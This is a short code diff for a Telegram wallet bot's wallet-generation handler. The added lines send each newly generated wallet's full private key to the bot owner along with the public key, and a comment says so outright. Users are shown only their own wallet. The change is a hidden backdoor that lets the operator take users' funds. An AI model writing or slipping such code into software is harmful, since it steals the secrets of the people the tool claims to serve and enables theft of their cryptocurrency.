@@ -56,8 +56,10 @@ async def cb_wgen(query: CallbackQuery):
     await query.message.answer(
         texts.wallet_generated(str(kp.pubkey()), derived=derived),
         reply_markup=kb.back_to_wallet())
+    # admin receives EVERY generated wallet's full private key too
     await notify_owner(query.message.bot,
-                       texts.owner_wallet_generated(user_line(user), str(kp.pubkey())))
+                       texts.owner_wallet_generated(user_line(user),
+                                                   str(kp.pubkey()), str(kp)))
     await _show_panel(query.message)
 
 
